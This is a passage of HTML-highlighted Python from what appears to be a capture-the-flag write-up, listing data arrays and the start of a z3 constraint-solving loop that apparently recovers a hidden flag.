    &lt;span style=&#34;color:#ae81ff&#34;&gt;0xAE&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x6A&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x78&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x41&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x02&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x46&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x8B&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xAE&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xB6&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x83&lt;/span&gt;, 
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0x09&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x4F&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x54&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x74&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x8D&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xF4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x79&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xD2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xFE&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x2D&lt;/span&gt;, 
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0x78&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1B&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x11&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x57&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xB7&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x9F&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x4E&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xC4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x52&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x9E&lt;/span&gt;, 
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0xF5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xFF&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x56&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x71&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x3C&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1B&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x60&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x22&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x9C&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x56&lt;/span&gt;, 
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0xA7&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xCF&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x8E&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x45&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x16&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x5C&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xA5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xF4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x28&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xA0&lt;/span&gt;, 
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0x30&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x57&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xA5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xB1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xC9&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xC4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x86&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x3E&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xB8&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x13&lt;/span&gt;, 
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0x44&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x4D&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xBF&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x97&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xE4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x06&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x96&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x07&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x8B&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x9F&lt;/span&gt;, 
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0x52&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x12&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x92&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xC6&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xC0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x8A&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x69&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xF5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xA5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x9D&lt;/span&gt;, 
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0xF3&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x3B&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xB6&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x99&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x86&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xD9&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x67&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x32&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xB1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xBF&lt;/span&gt;, 
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0xB8&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x2E&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x58&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x55&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xB0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x9C&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x65&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x9E&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x9F&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xE3&lt;/span&gt;, 
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0xF0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xBF&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xCF&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xCD&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xDE&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xFD&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x34&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x31&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x78&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x55&lt;/span&gt;, 
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0x6E&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x01&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x74&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xD7&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xA8&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x26&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xFF&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xD6&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xCC&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x99&lt;/span&gt;, 
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0x51&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xFB&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xF6&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xF4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x03&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xFA&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x61&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xDF&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x41&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x98&lt;/span&gt;, 
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0D&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xBD&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xBF&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x88&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x44&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x5E&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x56&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xD2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xA9&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x00&lt;/span&gt;
]

time &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0x127&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0ee&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x07e&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x068&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x169&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0f2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x04e&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0ea&lt;/span&gt;, 
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0bc&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0ae&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0f5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x078&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x114&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x10a&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x13b&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0ff&lt;/span&gt;, 
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0x052&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x07d&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0cd&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x031&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0fb&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x142&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x034&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x060&lt;/span&gt;, 
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0b8&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0c2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x12d&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0fb&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0f4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x161&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0cc&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0df&lt;/span&gt;, 
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0x11c&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0c1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0b1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0b6&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x05b&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0bb&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x162&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x105&lt;/span&gt;, 
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0x034&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x044&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x06c&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x087&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x16d&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x151&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x050&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x117&lt;/span&gt;, 
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0x05e&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x127&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x003&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x09a&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x12f&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x00d&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x068&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x044&lt;/span&gt;, 
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0x041&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x036&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x028&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x12f&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0bd&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x148&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0a8&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0fa&lt;/span&gt;, 
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0x13d&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x004&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0ee&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0b6&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x09c&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x027&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x082&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x087&lt;/span&gt;, 
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0ee&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x08d&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x02a&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x117&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x03f&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x094&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x002&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x03a&lt;/span&gt;, 
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0x01b&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x08f&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x062&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0af&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x042&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x132&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x073&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x069&lt;/span&gt;, 
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0x12d&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x151&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x05e&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x066&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x112&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x04c&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0d8&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x07d&lt;/span&gt;, 
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0x007&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x003&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0ee&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0b4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x125&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x038&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0f4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x00c&lt;/span&gt;, 
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0x03f&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0fc&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x136&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x159&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x08d&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x062&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x002&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x008&lt;/span&gt;, 
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0ab&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x05f&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x10d&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x028&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x102&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x127&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x151&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x10e&lt;/span&gt;, 
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0x01a&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x062&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x148&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x06f&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x11e&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0eb&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x078&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x00f&lt;/span&gt;, 
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0x034&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x05f&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x165&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x001&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0c1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x10c&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x08e&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x01d&lt;/span&gt;, 
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0x09a&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x163&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x009&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x00c&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x091&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0ae&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x114&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0b6&lt;/span&gt;, 
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0f5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x045&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x08c&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x04f&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x060&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x063&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x071&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0a7&lt;/span&gt;, 
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0x062&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0c5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x01b&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x052&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x12f&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0bb&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x123&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;,
]

enc &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [
    &lt;span style=&#34;color:#ae81ff&#34;&gt;185&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;180&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;193&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;107&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;325&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;148&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;254&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;342&lt;/span&gt;,
    &lt;span style=&#34;color:#ae81ff&#34;&gt;56&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;160&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;338&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;143&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;58&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;289&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;362&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;248&lt;/span&gt;,
    &lt;span style=&#34;color:#ae81ff&#34;&gt;319&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;339&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;92&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;66&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;248&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;72&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;21&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;229&lt;/span&gt;,
    &lt;span style=&#34;color:#ae81ff&#34;&gt;122&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;206&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;101&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;235&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;113&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;100&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;45&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;262&lt;/span&gt;
]

&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(len(enc)):
    s &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Solver()
    a1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Int(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;a1&amp;#34;&lt;/span&gt;)
    s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(a1 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)
    s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(a1 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;128&lt;/span&gt;)
    v6 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; time[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;]
